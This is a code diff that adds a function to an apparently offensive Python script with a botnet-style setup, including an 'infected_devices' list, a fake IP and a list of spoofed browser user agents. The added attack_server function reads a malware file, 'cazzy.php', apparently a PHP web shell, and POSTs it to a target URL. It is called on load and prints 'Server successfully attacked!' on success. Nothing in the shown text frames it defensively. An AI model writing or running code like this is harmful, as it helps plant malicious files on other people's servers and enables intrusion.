@@ -33,6 +33,34 @@ bot_count = 100000000
 infected_devices = []
 fake_ip = '96.250.255.190'
 
+
+def attack_server(malware_path):
+
+    url = target_url
+
+    payload = open(malware_path, 'rb').read()
+
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}  
+
+    
+    response = requests.post(url, data=payload, headers=headers)
+
+    
+
+    if response.status_code == 200:
+
+        print("Server successfully attacked!")
+
+    else:
+
+        print("Attack failed. Better luck next time!")
+
+
+malware_file = "cazzy.php"  
+
+attack_server(malware_file)
+
+
 user_agents = [
 
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
